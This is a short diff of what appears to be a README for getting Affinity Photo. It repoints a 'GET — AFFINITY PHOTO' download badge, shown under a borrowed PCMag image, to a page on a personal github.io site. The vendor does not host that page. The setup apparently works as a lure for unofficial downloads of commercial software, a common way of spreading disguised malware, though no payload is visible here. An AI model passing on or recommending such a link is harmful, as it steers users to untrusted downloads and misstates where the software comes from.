@@ -4,7 +4,7 @@
 <img src="https://i.pcmag.com/imagery/reviews/06JQnPuKCHyQZNr0z9tV116-78.fit_scale.size_400x225.v1773342642.png" width="400">
 </p>
 
-[![GET — AFFINITY PHOTO](https://img.shields.io/badge/GET-AFFINITY%20PHOTO-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — AFFINITY PHOTO](https://img.shields.io/badge/GET-AFFINITY%20PHOTO-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/Affinity-Photo)
 
 ---
 
